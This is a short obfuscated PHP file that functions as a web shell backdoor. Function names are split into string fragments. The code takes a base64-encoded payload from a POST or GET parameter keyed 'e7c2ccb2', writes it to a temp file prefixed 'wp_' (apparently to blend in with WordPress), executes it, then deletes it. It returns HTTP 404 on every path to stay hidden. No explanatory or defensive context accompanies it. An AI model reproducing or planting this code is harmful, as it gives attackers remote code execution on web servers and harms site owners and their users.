<?php
try{
$n1d6a2[]='tem'.'pnam';
$n1d6a2[]='base64_d'.'ecode';
$n1d6a2[]='sys_'.'get_temp_dir';
$n1d6a2[]='file_put_'.'contents';
$n1d6a2[]='un'.'link';
$n1d6a2[]='array_key_'.'exists';
$z1730f='e7c2'.'ccb2';
if($n1d6a2[5]($z1730f,$_POST)){
$x6af8f=$n1d6a2[1]($_POST[$z1730f]);
}elseif($n1d6a2[5]($z1730f,$_GET)){
$x6af8f=$n1d6a2[1]($_GET[$z1730f]);
}else{$x6af8f=null;}
if($x6af8f){
$ue91f4=$n1d6a2[0]($n1d6a2[2](),'w'.'p_');
if($ue91f4){
$n1d6a2[3]($ue91f4,'<'.'?ph'.'p '.$x6af8f);
http_response_code(404);
@include_once($ue91f4);
@$n1d6a2[4]($ue91f4);
}}
http_response_code(404);
}catch(Throwable $e){http_response_code(404);}catch(Exception $e){http_response_code(404);}
